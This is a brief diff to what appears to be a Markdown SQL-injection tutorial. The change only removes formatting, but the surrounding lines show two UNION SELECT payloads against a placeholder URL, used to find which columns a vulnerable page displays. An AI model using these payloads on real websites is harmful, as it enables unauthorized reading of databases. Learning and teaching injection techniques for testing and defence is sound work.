@@ -46,7 +46,7 @@
 **To find visiable columns after finding number of columns we use these payloads:**
 
 - **Payloads**
-    - `***URL: XYZ.online/post.php?id=1'+UNION+SELECT+"STR1"+"STR2"+"STR3"+"STR4"+"STR5"+"STR6"+"STR7"+"STR8"+"STR9"+"STR10"+--+-***`
+    - `URL: XYZ.online/post.php?id=1'+UNION+SELECT+"STR1"+"STR2"+"STR3"+"STR4"+"STR5"+"STR6"+"STR7"+"STR8"+"STR9"+"STR10"+--+-`
     - `URL: XYZ.online/post.php?id=1'+UNION+SELECT+1+2+3+4+5+6+7+8+9+10+--+-`
 
 
